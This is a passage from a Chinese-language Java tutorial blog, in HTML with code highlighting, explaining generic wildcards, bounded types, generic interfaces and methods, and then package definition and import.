class="line"><span class="comment">//泛型引用传递处理</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Message3</span>&lt;T&gt;&#123;</span><br><span class="line">    <span class="keyword">private</span> T content;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setContent</span><span class="params">(T content)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.content = content;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">getContent</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test35</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Message3&lt;String&gt; msg = <span class="keyword">new</span> <span class="title class_">Message3</span>&lt;&gt;();</span><br><span class="line">        msg.setContent(<span class="string">&quot;mes9s0&quot;</span>);</span><br><span class="line">        fun(msg);<span class="comment">//引用传递</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">fun</span><span class="params">(Message3&lt;String&gt; temp)</span>&#123;</span><br><span class="line">        System.out.println(temp.getContent());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    这是一个标准的引用传递，但是这个时候会出现问题。而问题的关键在于fun()方法上，如果真的去使用泛型不可能只是一种类型，也就是说fun()方法应该可以接收任意种类型，但是这个时候他只能够接收“Message3<String>”类型。这时候我们在fun()方法中不设置泛型了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//泛型引用传递处理</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Message3</span>&lt;T&gt;&#123;</span><br><span class="line">    <span class="keyword">private</span> T content;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setContent</span><span class="params">(T content)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.content = content;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">getContent</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test35</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Message3&lt;Integer&gt; msgA = <span class="keyword">new</span> <span class="title class_">Message3</span>&lt;&gt;();</span><br><span class="line">        Message3&lt;String&gt; msgB = <span class="keyword">new</span> <span class="title class_">Message3</span>&lt;&gt;();</span><br><span class="line">        msgA.setContent(<span class="number">110</span>);</span><br><span class="line">        msgB.setContent(<span class="string">&quot;mes9s0&quot;</span>);</span><br><span class="line">        fun(msgA);<span class="comment">//引用传递</span></span><br><span class="line">        fun(msgB);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">fun</span><span class="params">(Message3 temp)</span>&#123;</span><br><span class="line">        System.out.println(temp.getContent());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    可以发现程序可以正常执行了，但是一个更严重的问题出现了。此时我们这么写代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//泛型引用传递处理</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Message3</span>&lt;T&gt;&#123;</span><br><span class="line">    <span class="keyword">private</span> T content;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setContent</span><span class="params">(T content)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.content = content;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">getContent</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test35</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Message3&lt;Integer&gt; msgA = <span class="keyword">new</span> <span class="title class_">Message3</span>&lt;&gt;();</span><br><span class="line">        Message3&lt;String&gt; msgB = <span class="keyword">new</span> <span class="title class_">Message3</span>&lt;&gt;();</span><br><span class="line">        msgA.setContent(<span class="number">110</span>);</span><br><span class="line">        msgB.setContent(<span class="string">&quot;mes9s0&quot;</span>);</span><br><span class="line">        fun(msgA);<span class="comment">//引用传递</span></span><br><span class="line">        fun(msgB);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">fun</span><span class="params">(Message3 temp)</span>&#123;</span><br><span class="line">        temp.setContent(<span class="number">1.1</span>);<span class="comment">//!!!!!!!!!!!添加的一行</span></span><br><span class="line">        System.out.println(temp.getContent());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073555.jpg"                      alt="image-20220706133217138"                >    </p><p>​    这个时候发现，如果不设置泛型，那么在方法之中就有可能对你的数据进行修改，所以此时我们还需要一种方案，可以接收所有的泛型类型，并且不能够修改里面的数据（允许获取），那么就需要通过通配符“&lt;?&gt;”来解决。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test35</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Message3&lt;Integer&gt; msgA = <span class="keyword">new</span> <span class="title class_">Message3</span>&lt;&gt;();</span><br><span class="line">        Message3&lt;String&gt; msgB = <span class="keyword">new</span> <span class="title class_">Message3</span>&lt;&gt;();</span><br><span class="line">        msgA.setContent(<span class="number">110</span>);</span><br><span class="line">        msgB.setContent(<span class="string">&quot;mes9s0&quot;</span>);</span><br><span class="line">        fun(msgA);<span class="comment">//引用传递</span></span><br><span class="line">        fun(msgB);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">fun</span><span class="params">(Message3&lt;?&gt; temp)</span>&#123;</span><br><span class="line">        System.out.println(temp.getContent());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    此时在fun()方法里由于采用了Message结合通配符的处理可以接收所有的类型，并且不允许修改只允许获取数据。</p><p>​    在“?”这个通配符的基础之上实际上还提供有两类小的通配符:</p><p>​    1、?extends类：设置泛型的上限；</p><p>​        -例如：定义“?extends Number”：表示该泛型类型只允许设置Number或Number的子类。</p><p>​    2、?super类：设置泛型的下限；</p><p>​        -例如：定义“?super String”：只能够使用String或其父类；</p><p>范例：观察泛型的上限配置。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//泛型引用传递处理</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Message3</span>&lt;T <span class="keyword">extends</span> <span class="title class_">Number</span>&gt;&#123;</span><br><span class="line">    <span class="keyword">private</span> T content;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setContent</span><span class="params">(T content)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.content = content;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">getContent</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test35</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Message3&lt;Integer&gt; msgA = <span class="keyword">new</span> <span class="title class_">Message3</span>&lt;&gt;();</span><br><span class="line">        Message3&lt;String&gt; msgB = <span class="keyword">new</span> <span class="title class_">Message3</span>&lt;&gt;();<span class="comment">//！！！</span></span><br><span class="line">        msgA.setContent(<span class="number">110</span>);</span><br><span class="line">        msgB.setContent(<span class="string">&quot;mes9s0&quot;</span>);<span class="comment">//！！！！！不成功</span></span><br><span class="line">        fun(msgA);<span class="comment">//引用传递</span></span><br><span class="line">        fun(msgB);<span class="comment">//！！！</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">fun</span><span class="params">(Message3&lt;? extends Number&gt; temp)</span>&#123;</span><br><span class="line">        System.out.println(temp.getContent());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    此时编译不成功，因为只能是Number的子类。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073556.jpg"                      alt="image-20220706135226628"                ></p><p>范例：设置泛型下限。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//泛型引用传递处理</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Message3</span>&lt;T&gt;&#123;</span><br><span class="line">    <span class="keyword">private</span> T content;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setContent</span><span class="params">(T content)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.content = content;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">getContent</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test35</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Message3&lt;Integer&gt; msgA = <span class="keyword">new</span> <span class="title class_">Message3</span>&lt;&gt;();<span class="comment">//!!!!!!!!!</span></span><br><span class="line">        Message3&lt;String&gt; msgB = <span class="keyword">new</span> <span class="title class_">Message3</span>&lt;&gt;();</span><br><span class="line">        msgA.setContent(<span class="number">110</span>);<span class="comment">//!!!!!!!!!</span></span><br><span class="line">        msgB.setContent(<span class="string">&quot;mes9s0&quot;</span>);</span><br><span class="line">        fun(msgA);<span class="comment">//引用传递</span></span><br><span class="line">        fun(msgB);<span class="comment">//!!!!!!!!!!!!!!!!!</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">fun</span><span class="params">(Message3&lt;? <span class="built_in">super</span> String&gt; temp)</span>&#123;</span><br><span class="line">        System.out.println(temp.getContent());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    通配符是一个重要的概念，并且要求你一定可以理解此概念的定义，在未来系统类库会有大量的使用。</p><h5 id="泛型接口"><a href="#泛型接口" class="headerlink" title="泛型接口"></a>泛型接口</h5><p>​    泛型除了可以在类上定义之外也可以直接在接口之中进行使用。</p><p>例如：下面定义一个泛型接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">IMessage3</span>&lt;T&gt;&#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">echo</span><span class="params">(T t)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    对于泛型接口的子类而言现在就有两种实现方式。</p><p>实现方式一：在子类之中就继续设置泛型定义。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">IMessage3</span>&lt;T&gt;&#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">echo</span><span class="params">(T t)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//子类继续使用泛型</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MessageImpl3</span>&lt;S&gt; <span class="keyword">implements</span> <span class="title class_">IMessage3</span>&lt;S&gt;&#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">echo</span><span class="params">(S t)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;【echo】&quot;</span> + t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test36</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        IMessage3&lt;String&gt; msg = <span class="keyword">new</span> <span class="title class_">MessageImpl3</span>&lt;&gt;();</span><br><span class="line">        System.out.println(msg.echo(<span class="string">&quot;mes9s0&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现方法二：在子类实现父接口的时候直接定义出具体泛型类型。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">IMessage3</span>&lt;T&gt;&#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">echo</span><span class="params">(T t)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//子类不继续使用泛型</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MessageImpl3</span> <span class="keyword">implements</span> <span class="title class_">IMessage3</span>&lt;String&gt;&#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">echo</span><span class="params">(String t)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;【echo】&quot;</span> + t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test36</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        IMessage3&lt;String&gt; msg = <span class="keyword">new</span> <span class="title class_">MessageImpl3</span>();</span><br><span class="line">        System.out.println(msg.echo(<span class="string">&quot;mes9s0&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    如果从概念和实现来讲并不复杂，但是在日后会遇见大量出现有泛型的接口，这个时候一定要清楚两种实现原则。</p><h5 id="泛型方法"><a href="#泛型方法" class="headerlink" title="泛型方法"></a>泛型方法</h5><p>​    在之前的程序类里面实际上已经可以发现在泛型类之中如果将泛型标记写在了方法上，那么这样的方法就被称为泛型方法。但是需要注意注意的是，泛型方法不一定非要出现在泛型类之中。如果一个类没有定义泛型，那么也可以使用泛型方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test37</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Integer[] num = fun(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> temp:num)&#123;</span><br><span class="line">            System.out.print(temp+<span class="string">&quot;、&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T[] fun(T ... args)&#123;</span><br><span class="line">        <span class="keyword">return</span> args;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    后期进行开发的时候，这种泛型方法很常见，以之前的工厂设计为例。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073557.jpg"                      alt="image-20220706145907425"                ></p><p>​    此时如果一个项目有上千个接口，那原地起飞。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073558.jpg"                      alt="image-20220706150245576"                ></p><p>​    哪怕是这样的传统设计模式，在工厂类中也会极度繁琐的重复方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">IFood1</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Factory3</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">getInstance</span><span class="params">(String classname)</span> &#123;</span><br><span class="line">        <span class="keyword">switch</span>(classname)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;bread&quot;</span>: &#123;</span><br><span class="line">                <span class="keyword">return</span> (T) <span class="keyword">new</span> <span class="title class_">Bread1</span>();</span><br><span class="line">            &#125; <span class="keyword">case</span> <span class="string">&quot;milk&quot;</span> : &#123;</span><br><span class="line">                <span class="keyword">return</span> (T) <span class="keyword">new</span> <span class="title class_">Milk1</span>();</span><br><span class="line">            &#125; <span class="keyword">default</span>:&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Bread1</span> <span class="keyword">implements</span> <span class="title class_">IFood1</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;吃面包&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Milk1</span> <span class="keyword">implements</span> <span class="title class_">IFood1</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;喝牛奶&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test37</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">IFood1</span> <span class="variable">ifood</span> <span class="operator">=</span> Factory3.getInstance(<span class="string">&quot;milk&quot;</span>);</span><br><span class="line">        ifood.eat();</span><br><span class="line">        ifood = Factory3.getInstance(<span class="string">&quot;bread&quot;</span>);</span><br><span class="line">        ifood.eat();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h4 id="包的定义及使用"><a href="#包的定义及使用" class="headerlink" title="包的定义及使用"></a>包的定义及使用</h4><p>​    利用包的可以实现类的包装，在以后的实际开发之中，所有的类都必须放在包里。</p><h5 id="包的定义"><a href="#包的定义" class="headerlink" title="包的定义"></a>包的定义</h5><p>​    操作系统中已经明确严格的定义了一个要求：同一个目录之中不允许存放有相同的程序类文件，但是在开发之中很难保证不重复，所以为了可以进行类的方便管理，那么往往可以程序文件放在不同的目录下，不同的目录之中是可以提供相同文件的，而这个包就是目录。</p><p>​    注意，一旦程序开发之中出现有包，此时程序编译后的结果就必须将*.class的文件保存在指定的目录之中，如果手工处理非常的麻烦，那么此时最好的做法是可以进行打包编译处理：javac -d . Hello.java</p><p>​    1、“-d”：表示要生成目录，而目录的结构就是package定义的结构</p><p>​    2、“.”：表示在当前所在的目录中生成程序类文件</p><p>​    有了包后，完整的类名称是包.类名称。</p><h5 id="包的导入"><a href="#包的导入" class="headerlink" title="包的导入"></a>包的导入</h5><p>​    利用包的定义可以将不同功能的类保存在不同的包之中，但是这些类彼此之间也会存在有互相调用的关系。这个时候需要import导入其他包中的程序类。</p><p>范例：</p><p>​    定义一个程序类“package.Message”，这个类负责进行一个消息数据。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> packageTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Message</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getContent</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;消息内容&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    定义一个测试类使用Message类“package2.TestMessage”</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> package2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> packageTest.Message;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MessageTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Message</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Message</span>();</span><br><span class="line">        System.out.println(msg.getContent());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    此时按照使用顺序来讲肯定要先编译Message.java，而后再编译TestMessage.java。但是有一个问题，如果现在的程序代码，里面有100个类，彼此之间互相引用严格，此时怎么区分？那么此时最好不区分顺序，交给java自己完成，我们可以使用编译语句“javac -d . *.java”。</p><p>​    我们把Message类中的public删掉，可以发现</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073600.jpg"                      alt="image-20220706174217186"                ></p><p>​    注意：关于public class 与class定义的区别</p><p>​    <em><em>public class：类名称必须与文件名称保持一致，一个</em>.java文件里面只允许有一个public class，同时如果一个类需要被其他的包所使用，那么这个类一定要定义为public class。</em>*</p><p>​    <em><em>class：类名称可以与文件名称不一致，并且在一个</em>.java文件里面可以提供有多个class定义，编译后将形成不同的*.class文件，但是这些类只能够被本包所访问，如果要被其他的包所使用，那么这个类一定要定义为public class。</em>*</p><p>​    <em><em>1、在实际的开发之中往往在一个</em>.java源代码文件里面只会提供有一个程序类，而这个程序类一般都使用public class定义。所有的程序类中定义的包名称必须采用小写字母的形式定义。</em>*</p><p>​    